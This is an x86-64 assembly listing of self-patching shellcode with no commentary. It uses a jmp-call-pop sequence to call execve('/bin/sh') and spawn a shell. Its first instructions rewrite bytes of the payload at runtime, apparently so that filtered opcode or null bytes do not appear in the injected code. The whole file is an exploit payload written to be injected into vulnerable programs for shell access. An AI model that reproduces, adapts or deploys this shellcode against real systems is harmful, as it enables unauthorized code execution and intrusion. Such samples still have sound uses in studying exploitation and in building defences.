[global _start]
  
_start:
  sub byte [rdx + 27], 1
  sub byte [rdx + 28], 1
  sub byte [rdx + 43], 0xcc
  jmp ed

st:
  ; execve(const char *filename, const char * const argv[], const char * const envp[])
  pop rdi
  xor rax, rax
  add al, 59
  xor rsi, rsi
  xor rdx, rdx
  syscall
  ret
  nop

ed:
  call st
  db "/bin/sh"
